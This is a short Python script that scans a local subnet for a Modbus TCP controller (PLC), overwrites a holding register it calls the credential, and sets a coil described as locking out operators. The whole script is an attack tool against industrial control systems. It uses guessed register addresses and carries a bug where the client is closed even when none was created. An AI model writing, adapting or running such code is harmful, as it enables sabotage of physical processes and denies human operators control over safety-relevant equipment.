from pymodbus.client.sync import ModbusTcpClient
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to change credential
def change_credential(client, new_credential):
    try:
        # Read the current credential
        current_credential = client.read_holding_registers(0x1000, 1)
        current_credential = current_credential.registers[0]
        print(f"Current credential: {current_credential}")
        
        # Change the credential by writing the new credential to the PLC
        client.write_register(0x1000, new_credential)
        print(f"Credential changed to: {new_credential}")
    except Exception as e:
        print(f"Failed to change credential: {e}")

# Function to lock out operators
def lock_out_operators(client):
    try:
        # Enable the BCU key to lock out operators
        client.write_coil(0x0001, 1)
        print("Operators locked out")
    except Exception as e:
        print(f"Failed to lock out operators: {e}")

# Main function
def main():
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        client = ModbusTcpClient(plc_ip_address)
        connection = client.connect()
        print(f"Connected to PLC: {connection}")
        
        # Change the credential
        new_credential = 0x1234
        change_credential(client, new_credential)
        
        # Lock out operators
        lock_out_operators(client)
    else:
        print("Failed to find PLC's IP address")
    client.close()

if __name__ == "__main__":
    main()